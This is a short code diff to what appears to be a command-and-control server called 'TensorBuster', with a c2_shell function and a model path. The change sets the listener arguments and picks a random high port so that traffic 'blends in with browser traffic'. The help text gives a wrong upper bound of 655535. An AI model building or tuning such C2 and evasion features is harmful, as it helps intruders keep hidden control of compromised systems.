@@ -102,13 +102,13 @@ def c2_shell() -> str:
 def main():
     parser = ArgumentParser(description="TensorBuster C2 Server")
 
-    parser.add_argument("--listener-ip", required=True, help="Listener IP address")
-    parser.add_argument("--listener-port", required=True, help="Listener Port")
+    parser.add_argument("--listener-ip", required=True, type=str, help="Listener IP address")
+    parser.add_argument("--listener-port", type=int, help="Listener Port (default: random integer between 30000 and 655535 to blend in with browser traffic)")
 
     args = parser.parse_args()
 
-    ip = args.listener_ip if args.listener_ip else gethostbyname(gethostname())
-    port = args.listener_port if args.listener_port else 8000
+    ip = args.listener_ip
+    port = args.listener_port if args.listener_port else random.randint(30000, 65535)
 
     model_path = "./tb-base-model"
 
